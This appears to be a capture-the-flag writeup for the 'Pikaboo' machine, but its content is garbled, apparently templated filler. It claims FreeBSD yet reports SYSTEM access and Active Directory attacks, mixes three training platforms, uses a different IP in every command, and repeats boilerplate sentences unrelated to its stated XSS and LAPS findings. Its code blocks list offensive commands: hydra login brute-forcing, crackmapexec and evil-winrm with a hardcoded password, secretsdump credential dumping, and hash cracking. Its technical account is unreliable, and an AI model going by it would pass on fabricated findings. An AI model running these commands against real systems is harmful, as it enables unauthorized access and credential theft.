---
TitleSEO: "OffSec Proving Grounds — Pikaboo (Insane FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Pikaboo (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Pikaboo. LAPS Abuse and XSS to achieve insane compromise on FreeBSD."
Keywords: "forensics, active directory, medium, tryhackme, insane, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-pikaboo-557.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-pikaboo-557/"
Date: "2025-11-25"
Tags: "Forensics, Active Directory, Medium, TryHackMe, Insane, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-pikaboo-557"
Permalink: "/writeups/htb-pikaboo-557.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Pikaboo** is rated **Insane** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.112.63.248`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.15.230.206 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.125.171.171 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.51.161.204 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.77.194/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
evil-winrm -i 10.109.75.183 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.26.37.189 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.29.154.23/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

Key finding: **XSS**.

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.61.140.243
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.78.231.1/FUZZ
gobuster dir -u http://10.64.4.225/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p1521,53,5986 10.34.93.202 -oN scan.txt
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.94.220.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.97.213.118/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `hashcat`
- `ldapsearch`
- `rpcclient`
- `sqlmap`
- `msfvenom`
- `burpsuite`

### Key Takeaways

- LAPS Abuse
- XSS
